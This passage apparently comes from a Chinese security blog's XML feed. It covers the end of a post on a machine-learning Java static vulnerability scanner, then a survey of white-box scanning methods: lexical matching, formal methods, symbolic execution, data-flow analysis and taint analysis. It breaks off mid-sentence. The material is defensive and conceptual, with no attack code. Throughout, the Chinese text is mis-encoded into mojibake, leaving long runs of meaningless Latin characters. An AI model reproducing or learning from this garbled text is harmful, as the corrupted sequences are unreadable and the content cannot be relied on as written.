äº§ç”Ÿéå¸¸é«˜çš„è¯¯æŠ¥ç‡ï¼ˆè¯¯æŠ¥ç‡ä¸º1-65.09%=34.91%ï¼‰ä»è€Œå¯¼è‡´å‡†ç¡®ç‡å’Œ F1 å€¼æ°´å¹³ä¹Ÿè¾ƒä½ï¼Œä¸å‡†ç¡®çš„æ¼æ´æŠ¥å‘Šä¸ä»…ä¼šç»™å®‰å…¨å·¥ç¨‹å¸ˆé€ æˆå·¨å¤§å‹åŠ›ï¼Œæ›´å¯èƒ½é€ æˆé¡¹ç›®å¼€å‘è¿›åº¦è¢«é˜»å¡ï¼Œè€Œæœ¬ç³»ç»Ÿç»“åˆæ±¡ç‚¹åˆ†æå’Œæœºå™¨å­¦ä¹ çš„ä¼˜åŠ¿ï¼Œä»…ç‰ºç‰² 11.35% çš„å¬å›ç‡ï¼Œå°†ç²¾ç¡®ç‡æé«˜åˆ° 90% ä»¥ä¸Šï¼Œå³å¹³å‡ç³»ç»Ÿä¸­æŠ¥å‘Šçš„ 10 ä¸ªæ¼æ´ä¸­ï¼Œåªæœ‰ä¸€ä¾‹å¯èƒ½ä¸ºè¯¯æŠ¥ã€‚åœ¨å‡†ç¡®ç‡å’Œ F1 æŒ‡æ ‡ä¸Šä¹Ÿè¿œé«˜äº Find Security Bugsï¼Œè¿™è¯´æ˜ç‰ºç‰²å¬å›ç‡å…·æœ‰è¾ƒé«˜çš„æ”¶ç›Šæ¯”ã€‚</p><p>ç»¼ä¸Šï¼Œç›¸è¾ƒäºä¼ ç»Ÿæ±¡ç‚¹åˆ†æç±»æ‰«æå™¨ï¼Œæœ¬ç³»ç»Ÿèƒ½æ›´å‡†ç¡®åœ°å‘ç°æ¼æ´ï¼Œå¹¶ä¸”ä»¥è¾ƒå°çš„ä»£ä»·æå‡å‡†ç¡®æ€§ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä»‹ç»äº†ä¸€æ¬¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿï¼ŒåŸºäºå­¦æœ¯ç•Œå‰æ²¿å·¥ä½œï¼Œç›¸å¯¹äºä¼ ç»Ÿæ‰«æå·¥å…·æœ¬ç³»ç»Ÿèƒ½æä¾›æ›´å‡†ç¡®çš„æ‰«æç»“æœï¼ŒåŒæ—¶ç³»ç»Ÿè§£å†³äº†å­¦æœ¯å·¥å…·åªèƒ½åº”å¯¹å°è§„æ¨¡ç¨‹åºçš„é—®é¢˜ï¼Œä½¿å…¶å¯ç”¨äºå®é™…ç”Ÿäº§ç¯å¢ƒã€‚åœ¨æœªæ¥å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å°†ä¼šè¦†ç›–æ›´å¤šæ¼æ´ç±»å‹ã€æ‰©å……å­¦ä¹ æ•°æ®å¹¶å¯¹ç‰¹å®šæ¼æ´ç‹¬ç«‹è®­ç»ƒæ¨¡å‹ï¼Œä½¿æ‰«ææŠ¥å‘Šæ›´åŠ å‡†ç¡®ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ol><li><p>Li Z, Zou D, Xu S, et al. Vuldeepecker: A deep learning-based system for vulnerability detection[J]. // Proceedings of the 2018 Network and Distributed System Security Symposium </p></li><li><p>Koc U, Saadatpanah P, Foster J S, et al. Learning a classifier for false positive error reports emitted by static code analysis tools[C]//Proceedings of the 1st ACM SIGPLAN International Workshop on Machine Learning and Programming Languages. 2017: 35-42.</p></li><li><p>Koc U, Wei S, Foster J S, et al. An Empirical Assessment of Machine Learning Approaches for Triaging Reports of a Java Static Analysis Tool[C]//Proceedings of the 12th IEEE Conference on Software Testing, Validation and Verification (ICST). IEEE, 2019: 288-299.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°</title>
      <link href="/whitebox-%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
      <url>/whitebox-%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>å†™æ¯•è®¾è°ƒæŸ¥èƒŒæ™¯çŸ¥è¯†æ—¶åšçš„ï¼Œåœ¨<a href="https://www.t00ls.net/thread-56572-1-1.html" target="_blank" rel="noopener">t00ls</a>å’Œ<a href="https://forum.90sec.com/t/topic/1087" target="_blank" rel="noopener">90sec</a>å‘è¿‡å¸–å­ï¼Œè¿™é‡Œåšå½’æ¡£ç”¨ã€‚</p><h1 id="è¯æ³•åˆ†ææŠ€æœ¯"><a href="#è¯æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="è¯æ³•åˆ†ææŠ€æœ¯"></a>è¯æ³•åˆ†ææŠ€æœ¯</h1><p>è¯æ³•åˆ†ææŠ€æœ¯æ˜¯æœ€ç®€å•çš„ä¸€ç±»æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯å°†ä»£ç æ–‡æœ¬ä¸å½’çº³å¥½çš„ç¼ºé™·æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ­¤å‘ç°æ¼æ´ã€‚ç”±äºå…¶ä¸æ·±å…¥åˆ†æç¨‹åºç»“æ„å’Œè¯­ä¹‰ï¼Œå¾€å¾€åªèƒ½æŒ–æ˜è¾ƒä¸ºç®€å•çš„ä¸€ç±»æ¼æ´ï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡ï¼Œåœ¨å®é™…åœºæ™¯ä¸‹åº”ç”¨è¾ƒå°‘ï¼Œä½†ç”±äºå…¶æ€æƒ³ç®€å•ï¼Œé€‚ç”¨æ€§å¾ˆå¹¿ï¼Œç›®å‰ä¹Ÿè¿˜å­˜åœ¨ç±»ä¼¼å·¥å…·ï¼Œå¦‚ï¼š<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">MobSF</a>ï¼Œ<a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">Cobra</a>ã€‚</p><a id="more"></a><h1 id="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"><a href="#å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"></a>å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯</h1><p>å½¢å¼åŒ–æ–¹æ³•åˆ†æä¸»è¦æ€æƒ³æ˜¯å°†è½¯ä»¶ä»£ç æ€§è´¨è¿›è¡Œå½¢å¼åŒ–æè¿°ï¼Œå†åˆ¤æ–­è¯¥æè¿°æ˜¯å¦æ»¡è¶³æ¼æ´ç‰¹å¾çš„ä¸€ç±»åˆ†ææ–¹æ³•[1]ï¼Œå…¶ä¸­å®šç†è¯æ˜æŠ€æœ¯æ˜¯å½¢å¼åŒ–ä»£ç åˆ†ææŠ€æœ¯çš„ä¸»è¦ä»£è¡¨ã€‚</p><p>å®šç†è¯æ˜æŠ€æœ¯å°†æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰å®šä¹‰ä¸ºä¸€å®šç†ï¼Œå†å°†æºç¨‹åºä»£ç ç‰¹å¾è½¬åŒ–ä¸ºæ•°å­¦è¡¨è¾¾å½¢å¼ï¼Œæœ€åå¯¹æ•°å­¦è¡¨è¾¾è¿›è¡Œé€»è¾‘æ¨ç†ï¼Œè‹¥å®šç†å­˜åœ¨æ€§å¾—ä»¥è¯æ˜ï¼Œåˆ™æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰ï¼Œå³æ¼æ´æŒ–æ˜è¿‡ç¨‹ç±»ä¼¼äºæ•°å­¦ä¸Šçš„å®šç†è¯æ˜è¿‡ç¨‹ã€‚ä¸»è¦ä»£è¡¨æ€§å·¥å…·æœ‰ <a href="https://fbinfer.com/" target="_blank" rel="noopener">infer</a>ã€ ESC/Java[2] å’Œ saturn[3]ã€‚</p><p>è¯¥æŠ€æœ¯ä½œä¸ºä¸€ç§ä½¿ç”¨ä¸¥æ ¼æ•°ç†é€»è¾‘æ¨ç†ä½œä¸ºæ£€æµ‹æ‰‹æ®µçš„æŠ€æœ¯ï¼Œè¯¯æŠ¥ç‡è¾ƒä½ï¼Œä½†ç”±äºå…¶éœ€è¦é’ˆå¯¹ç‰¹å®šæ¼æ´æ„å»ºæ•°å­¦æ¡ä»¶ï¼Œéœ€è¦å¤§é‡äººå·¥å‚ä¸ï¼Œæœ‰çš„æ¼æ´ç”šè‡³éš¾ä»¥ç”¨æ•°å­¦ç»“æ„è¡¨è¾¾ï¼Œç›®å‰åªé€‚ç”¨äºæ­»å¾ªç¯ã€èµ„æºæ³„éœ²å’Œç©ºæŒ‡é’ˆç­‰é—®é¢˜ï¼Œå¯¹æ–°æ¼æ´çš„æ‰©å±•æ€§ä¸é«˜ï¼ŒåŒæ—¶ï¼Œå¦‚ä½•å°†å¤§è§„æ¨¡ç¨‹åºåº”ç”¨äºå½¢å¼åŒ–æ–¹æ³•åˆ†æä¹Ÿæˆä¸ºå·¥ä¸šç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ã€‚ </p><p>å¯¹äºå½¢å¼åŒ–åˆ†ææŠ€æœ¯æœ¬äººä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œæƒ³è¦è¿›ä¸€æ­¥äº†è§£çš„å»ºè®®çœ‹ä¸‹è®ºæ–‡[1]å’Œ<a href="https://github.com/leanprover/lean2" target="_blank" rel="noopener">lean2</a>ã€‚</p><h1 id="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"><a href="#ç¬¦å·æ‰§è¡ŒæŠ€æœ¯" class="headerlink" title="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"></a>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯</h1><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ä¸€ç§å°†ç¨‹åºæ‰§è¡Œå¯è¾¾æ€§é—®é¢˜è½¬åŒ–ä¸ºçº¦æŸæ±‚è§£é—®é¢˜ï¼Œå¹¶ä»¥æ­¤è¿›è¡Œæ¼æ´æŒ–æ˜çš„æŠ€æœ¯[4]ï¼Œä»£è¡¨æ€§å·¥å…·æœ‰<a href="http://angr.io/" target="_blank" rel="noopener">angr</a>ï¼ŒDART[5], CUTE[6], EXE[7]å’ŒKLEE[8]ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œç¬¦å·æ‰§è¡ŒåŒ…å«ä¸€ä¸ªç¬¦å·çŠ¶æ€è¡¨$\sigma$å’Œä¸€ä¸ªç¬¦å·è·¯å¾„çº¦æŸ $PC$ ï¼Œå¼€å§‹æ—¶ï¼Œ $\sigma=\varnothing, PC=true$ ï¼Œæ¯è¯»å–ä¸€æ¡è¯­å¥ï¼Œå°±å°†å˜é‡æŠ½è±¡ä¸ºçº¦æŸæ±‚è§£ä¸­çš„å˜é‡ã€å¸¸é‡æˆ–ä»–ä»¬çš„è¡¨è¾¾å¼æ”¾å…¥ $\sigma$ ä¸­ï¼Œç‰¹åˆ«çš„ï¼Œå½“é‡åˆ°æ¡ä»¶åˆ¤æ–­ $if(e)$ æ—¶ï¼Œå°†ifåˆ†æ”¯çš„ $PC$ æ›´æ–°ä¸º $PC \wedge \sigma(e)$ ï¼Œå°†elseåˆ†æ”¯çš„ $PCâ€™$ æ›´æ–°ä¸º $PC\wedge \neg\sigma(e)$ ï¼Œéšåä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£ $PC$ å’Œ $PCâ€™$ ï¼Œå¦‚æœçº¦æŸä¸æ»¡è¶³ï¼Œåˆ™åœæ­¢å¯¹è¯¥åˆ†æ”¯çš„è§£æï¼ˆå› ä¸ºè¯¥åˆ†æ”¯ä¸å¯è¾¾ï¼‰ã€‚å½“ç¬¦å·æ‰§è¡Œé‡åˆ°ç¨‹åºå´©æºƒã€é¢„å…ˆå®šä¹‰çš„æ¼æ´è¯­å¥ã€æˆ–æ˜¯ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼Œæ•´ä¸ªåˆ†æåœæ­¢ï¼ŒåŒæ—¶å¯ä»¥è®¡ç®—å¯ä»¥åˆ°è¾¾åœæ­¢ç‚¹çš„è¾“å…¥ã€‚</p><p>ç¬¦å·æ‰§è¡Œå¯ä»¥åˆ†æç¨‹åºä¸­çš„æ§åˆ¶æµã€è¦†ç›–æ›´å¤šä»£ç ï¼ŒåŒæ—¶ä¹Ÿæœ‰æ•ˆé™ä½äº†è¯¯æŠ¥ç‡ï¼Œä½†ä¼ ç»Ÿç¬¦å·æ‰§è¡Œä¸¥é‡ä¾èµ–äºçº¦æŸæ±‚è§£å™¨çš„èƒ½åŠ›ï¼Œä¾‹å¦‚ï¼Œè‹¥çº¦æŸæ±‚è§£å™¨ä¸èƒ½å¤„ç†éçº¿æ€§è®¡ç®—ï¼Œæˆ–æ˜¯æ•´ä¸ªç¨‹åºä¸­å­˜åœ¨æ— æ³•åˆ†æçš„ç¬¬ä¸‰æ–¹åº“ï¼Œé‚£ä¹ˆæ•´ä¸ªåˆ†æå°†æ— æ³•ç»§ç»­ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç ”ç©¶è€…ä»¬æå‡ºäº†åŠ¨æ€ç¬¦å·æ‰§è¡Œçš„æƒ³æ³•[5,6,7,8]ï¼Œä½†å…¶åœ¨å®é™…åº”ç”¨ä¸­ä»ä¸æ˜¯å¾ˆå¹¿æ³›ï¼Œä¸»è¦åŸå› åœ¨äºå…¶éœ€è¦å¤§é‡è®¡ç®—èµ„æºï¼Œç”šè‡³åœ¨å¤„ç†å¤§è§„æ¨¡ç¨‹åºæ—¶ï¼Œå‡ºç°çš„è·¯å¾„çˆ†ç‚¸é—®é¢˜ä¼šå¯¼è‡´çº¦æŸæ±‚è§£æ— æ³•äº§ç”Ÿç»“æœã€‚</p><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ç›®å‰å·¥ä¸šç•Œå’Œä¼ä¸šç•Œéƒ½åœ¨ç ”ç©¶çš„çƒ­é—¨é¢†åŸŸï¼Œè¿™é‡Œæ¨èè‹±è¯­å¥½çš„æœ‹å‹çœ‹ä¸‹<a href="https://www.youtube.com/watch?v=mffhPgsl8Ws" target="_blank" rel="noopener">æ­¤è§†é¢‘</a>å’Œç¬¦å·æ‰§è¡Œçš„ç»å…¸æ–‡ç« â€œSymbolic Execution for Software Testing: Three Decades Laterâ€[4]ï¼Œè‹±è¯­ä¸å¥½çš„æœ‹å‹æ¨èä¸€ä¸‹è¿™<a href="https://wcventure.github.io/" target="_blank" rel="noopener">wcventure</a>å¤§ä½¬æ€»ç»“çš„<a href="https://blog.csdn.net/wcventure" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><h1 id="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"><a href="#æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯" class="headerlink" title="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"></a>æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯</h1><p>æ•°æ®æµåˆ†ææ˜¯ä¸€ç§æŒ‰ç¨‹åºæ‰§è¡Œè·¯å¾„æ¨¡æ‹Ÿæ•°æ®æµåŠ¨çš„ä¸€ç§åˆ†ææŠ€æœ¯ï¼Œå…¶åŸæœ¬ç”¨äºè¿›è¡Œç¨‹åºä¼˜åŒ–[9]ï¼Œå®‰å…¨ç ”ç©¶è€…ä»¬å‘ç°åå°†å…¶è¿ç”¨äºæ¼æ´æŒ–æ˜ä¸­ï¼Œå¦‚ä»Šè¯¥æŠ€æœ¯åœ¨ç™½ç›’ï¼Œç°ç›’å’Œé»‘ç›’æµ‹è¯•éƒ½æœ‰åº”ç”¨[10]ã€‚</p><p>åœ¨æ•°æ®æµåˆ†æè¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨<strong>è¿‡ç¨‹å†…åˆ†æ</strong>å’Œ<strong>è¿‡ç¨‹é—´åˆ†æ</strong>ï¼Œè¿‡ç¨‹å†…åˆ†æä¸»è¦å¯¹å‡½æ•°å†…åˆ†æï¼Œè€Œè¿‡ç¨‹é—´åˆ†æä¸»è¦å¤„ç†è·¨å‡½æ•°åˆ†æã€‚</p><ul><li><p>å¯¹äºè¿‡ç¨‹å†…åˆ†æï¼Œæ ¹æ®å…¶å¯¹ç¨‹åºè·¯å¾„çš„åˆ†æç²¾åº¦ï¼Œå¯åˆ†ä¸ºæµä¸æ•æ„Ÿåˆ†æï¼Œæµæ•æ„Ÿåˆ†æå’Œè·¯å¾„æ•æ„Ÿåˆ†æã€‚æµä¸æ•æ„Ÿçš„æ•°æ®æµåˆ†æåªæ˜¯æŒ‰ä»£ç è¡Œå·ä»ä¸Šè€Œä¸‹è¿›è¡Œåˆ†æï¼›æµæ•æ„Ÿåˆ†æä¼šé¦–å…ˆäº§ç”Ÿç¨‹åºæ§åˆ¶æµå›¾ï¼ˆCFG, Control Flow Graphï¼‰ï¼Œå†æŒ‰ç…§CFGçš„æ‹“æ‰‘æ’åºæ­£å‘æˆ–é€†å‘åˆ†æï¼›è·¯å¾„æ•æ„Ÿä¿¡æ¯ä¸ä»…è€ƒè™‘åˆ°è¯­å¥å…ˆåé¡ºåºï¼Œè¿˜ä¼šè€ƒè™‘è¯­å¥å¯è¾¾æ€§ï¼Œå³ä¼šæ²¿å®é™…å¯æ‰§è¡Œåˆ°è·¯å¾„è¿›è¡Œåˆ†æã€‚</p></li><li><p>è¿‡ç¨‹é—´åˆ†æï¼Œé¦–å…ˆæ„é€ ç¨‹åºçš„è°ƒç”¨å›¾ï¼ˆCG, Call Graphï¼‰ï¼Œæ¥ç€éå†å›¾ä¸­å‡½æ•°è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå½“é‡åˆ°å…¶ä»–å‡½æ•°æ—¶ï¼Œè‹¥å·²åˆ†æè¿‡ï¼Œåˆ™ç›´æ¥ä½¿ç”¨åˆ†æç»“æœå‘ä¸‹åˆ†æï¼Œè‹¥æœªåˆ†æè¿‡ï¼Œåˆ™è·Ÿè¿›è¯¥å‡½æ•°ï¼Œå†æ¬¡è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¹¶ä¸”å°†åˆ†æç»“æœä¿å­˜ã€‚</p></li></ul><p>æ•°æ®æµåˆ†æèƒ½å¤Ÿä¸€å®šç¨‹åº¦ä¸Šç†è§£ç¨‹åºè¯­ä¹‰ï¼Œæ˜¯ä¸€ç§æ¯”è¯æ³•åˆ†ææŠ€æœ¯æ›´ä¸ºç²¾ç¡®çš„ä¸€ç±»åˆ†ææŠ€æœ¯ï¼Œå…¶å…³é”®åœ¨äºå‡†ç¡®è®¡ç®—ç¨‹åºçš„æ•°æ®æµã€‚</p><h1 id="æ±¡ç‚¹åˆ†ææŠ€æœ¯"><a href="#æ±¡ç‚¹åˆ†ææŠ€æœ¯" class="headerlink" title="æ±¡ç‚¹åˆ†ææŠ€æœ¯"></a>æ±¡ç‚¹åˆ†ææŠ€æœ¯</h1><p>æ±¡ç‚¹åˆ†æå±äºæ•°æ®æµåˆ†æçš„å˜ç§ï¼Œé€šè¿‡åˆ¤æ–­å…³é”®æ“ä½œçš„æ•°æ®ï¼ˆå¦‚è°ƒç”¨å±é™©å‡½æ•°çš„å‚æ•°ï¼‰æ˜¯å¦å¯è¢«ç”¨æˆ·æ“æ§ï¼Œæ¨æµ‹ç¨‹åºæ˜¯å¦å­˜åœ¨å®‰å…¨æ€§æ¼æ´ã€‚ç”±äºå…¶äº†è§£ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æœ‰è¾ƒå¼ºçš„å¯è§£é‡Šæ€§â€”â€”å®‰å…¨å·¥ç¨‹å¸ˆå¯ä»¥é€šè¿‡è·Ÿè¸ªæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹åˆ¤æ–­æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå› æ­¤å…¶ä¹Ÿæˆä¸ºäº†æŒ–æ˜ Web æˆ– Android æ¼æ´è¾ƒä¸ºå¸¸ç”¨çš„æŠ€æœ¯ï¼Œä¹Ÿè¢«å¾ˆå¤šå¼€æºæˆ–å•†ç”¨ç™½ç›’æ‰«æå™¨ä½¿ç”¨ï¼Œå¦‚ï¼šPixy[11]ã€Find Security Bugsã€<a href="https://www.microfocus.com/en-us/solutions/application-security" target="_blank" rel="noopener">Fortify</a>å’Œ<a href="https://lgtm.com/" target="_blank" rel="noopener">LGTM</a>ã€‚</p><h2 id="ä¸‰è¦ç´ "><a href="#ä¸‰è¦ç´ " class="headerlink" title="ä¸‰è¦ç´ "></a>ä¸‰è¦ç´ </h2><p>æ±¡ç‚¹åˆ†æä¸»è¦æœ‰ä¸‰ä¸ªç»„æˆè¦ç´ ï¼šæ±¡ç‚¹ä¿¡æ¯äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ã€æ±¡ç‚¹ä¿¡æ¯æ±‡èšç‚¹ï¼ˆsinkï¼‰å’Œæ±¡ç‚¹ä¿¡æ¯æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼Œå®ƒä»¬é€šå¸¸éœ€è¦å¯Œæœ‰ç»éªŒçš„å®‰å…¨å·¥ç¨‹å¸ˆæ‰‹åŠ¨è®¾ç½®ã€‚</p><ul><li>äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ï¼šæ±¡ç‚¹äº§ç”Ÿç‚¹å¾€å¾€æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œæ¯”å¦‚Webåº”ç”¨ä¸­è¯»å–URLå‚æ•°çš„å‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™äº›å‡½æ•°è°ƒç”¨åçš„è¿”å›å€¼è¢«æ ‡è®°ä¸ºæ±¡ç‚¹â€”â€”æ”»å‡»è€…å¯ä»¥æ“æ§çš„æ•°æ®ç‚¹ã€‚</li><li>æ±‡èšç‚¹ï¼ˆsinkï¼‰ï¼šæ£€æŸ¥ç‚¹æ˜¯ç¨‹åºçš„ä¸€äº›æ•æ„Ÿæ“ä½œï¼Œå¦‚è°ƒç”¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼Œæˆ–æ˜¯å°†æ•°æ®è¿”å›åˆ°ç½‘é¡µï¼Œå¦‚æœè¿™äº›æ“ä½œçš„æ•°æ®æ˜¯æ±¡ç‚¹ï¼Œé‚£ä¹ˆæ„å‘³ç€æ“ä½œå¯è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå³ç¨‹åºå­˜åœ¨æ¼æ´ã€‚</li><li>æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼šæ¸…æ´ç‚¹é€šå¸¸æ˜¯å¯¹æ±¡ç‚¹è¿›è¡Œæ¶ˆé™¤çš„ä¸€ç±»æ“ä½œï¼Œå¦‚SQLæ³¨å…¥ã€XSSä¸­çš„è¿‡æ»¤å‡½æ•°ã€‚æ¸…æ´ç‚¹æ˜¯æ±¡ç‚¹ä¼ æ’­å‡†ç¡®æ€§çš„é‡è¦ä¿è¯ï¼Œä¸èƒ½è¯†åˆ«æ¸…æ´ç‚¹å³ä¼šå¼•å‘æ±¡ç‚¹è¿‡æ±¡æŸ“é—®é¢˜ã€‚</li></ul><h2 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h2><p>æ±¡ç‚¹åˆ†æåˆ†ä¸ºé™æ€æ±¡ç‚¹åˆ†æå’ŒåŠ¨æ€æ±¡ç‚¹åˆ†æï¼Œä¸¤è€…åŒºåˆ«åœ¨äºé™æ€æ±¡ç‚¹åˆ†æåªä½¿ç”¨ç¨‹åºä»£ç æ¨¡æ‹Ÿæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ï¼Œè€ŒåŠ¨æ€æ±¡ç‚¹ä¼ æ’­åˆ™é€šè¿‡ç¨‹åºçš„å®é™…è¿è¡Œè¿›è¡Œä¼ æ’­ï¼Œç”±äºæœ¬æ–‡å…³æ³¨äºç™½ç›’æµ‹è¯•æƒ…æ™¯ï¼Œæ•…åªä»‹ç»é™æ€æ±¡ç‚¹ä¼ æ’­æ–¹æ³•ï¼Œè€Œåœ¨ä¸‹ä¸€å­ç« èŠ‚ä¼šä»‹ç»åŠ¨æ€ä¼ æ’­çš„ä¼˜åŠ£åŠ¿ã€‚</p><p>åœ¨å®šä¹‰å¥½ä¸‰è¦ç´ ä¹‹åï¼Œæ±¡ç‚¹åˆ†ææ³•ä¼šä¸æ•°æ®æµåˆ†æä¸€æ ·ï¼Œå¯¹ç¨‹åºè¿›è¡Œè¿‡ç¨‹å†…åˆ†æå’Œè¿‡ç¨‹é—´åˆ†æã€‚</p><p>è¿‡ç¨‹å†…åˆ†æåŒ…æ‹¬äº†æ˜¾å¼æµåˆ†æå’Œéšå¼æµåˆ†æï¼Œæ˜¾ç¤ºæµåˆ†æå³é€šè¿‡åˆ†æå˜é‡çš„æ•°æ®ä¾èµ–å…³ç³»è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ï¼Œè€Œéšå¼åˆ†æåˆ™æ˜¯æŒ‡è€ƒè™‘æ§åˆ¶ä¾èµ–è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204252182.png" alt="image-20200528204252182"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé¦–å…ˆå‡è®¾å˜é‡ $a$ ä¸ºæ±¡ç‚¹å˜é‡ï¼Œå®çº¿ç®­å¤´è¡¨ç¤ºäº†æ˜¾ç¤ºæ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œè€Œè™šçº¿ç®­å¤´è¡¨ç¤ºäº†éšå¼æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼ŒåŒæ—¶è¯¥å›¾ä¹Ÿè¯´æ˜äº†è¿‡ç¨‹å†…æ±¡ç‚¹ä¼ æ’­åŸºæœ¬æ€æƒ³ï¼Œå³ä»ä¸Šè‡³ä¸‹éå†æ•°æ®æµå›¾ï¼Œè‹¥æœªæ ‡è®°çš„å˜é‡ä¾èµ–äºæ±¡ç‚¹å˜é‡ï¼Œåˆ™æ–°å˜é‡ä¹Ÿè¢«æ ‡è®°ä¸ºæ±¡ç‚¹å˜é‡ã€‚è™½ç„¶æ”»å‡»è€…ç¡®å®å¯ä»¥åˆ©ç”¨æ§åˆ¶ä¾èµ–æ“ä½œæ•°æ®è¿›è¡Œæ”»å‡»ï¼Œä½†ç”±äºå…¶åˆ†æå¤æ‚ä¸”ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ï¼Œåœ¨å·¥ç¨‹é¢†åŸŸå¸¸å¸¸åªåšæ•°æ®æµä¾èµ–çš„æ˜¾ç¤ºåˆ†æï¼Œå› æ­¤æœ¬æ–‡ä¸»è¦è®¨è®ºæ˜¾å¼æµåˆ†æã€‚</p><p>ç°ä»£ç¨‹åºå­˜åœ¨ç€å¤æ‚çš„å‡½æ•°è°ƒç”¨ï¼Œé™¤äº†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œè¿˜éœ€è¦è¿›è¡Œè¿‡ç¨‹é—´åˆ†æã€‚å…¶åˆ†æé¦–å…ˆæ„é€ å‡½æ•°è°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼Œæ¥ç€æœç´¢å­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œå¯¹äºæ¯ä¸€ä¸ªå­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œè‡ªé¡¶å‘ä¸‹åˆ†æï¼ˆä¹Ÿå¯ä»¥è‡ªåº•å‘ä¸Šåˆ†æï¼‰ã€‚é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œè·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œè¿›è¡Œè¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æï¼Œå°†åˆ†æç»“æœè¡¨è¾¾ä¸º $\left\langle f, S, r\right\rangle$ çš„å‡½æ•°æ‘˜è¦ï¼Œå…¶ä¸­$f$åŒ…å«å‡½æ•°æœ¬èº«æ‘˜è¦ä¿¡æ¯ï¼ˆç±»åæ–¹æ³•åå’Œå‡½æ•°ç­¾åï¼‰ï¼Œ$S$ æŒ‡è°ƒç”¨è¿‡è¯¥å‡½æ•°åè¢«æ±¡æŸ“çš„å˜é‡é›†åˆï¼Œ$r$ å–å€¼0æˆ–1ï¼Œæ ‡è®°å‡½æ•°è¿”å›å€¼æ˜¯å¦è¢«æ±¡æŸ“ï¼›æ¥ç€æ 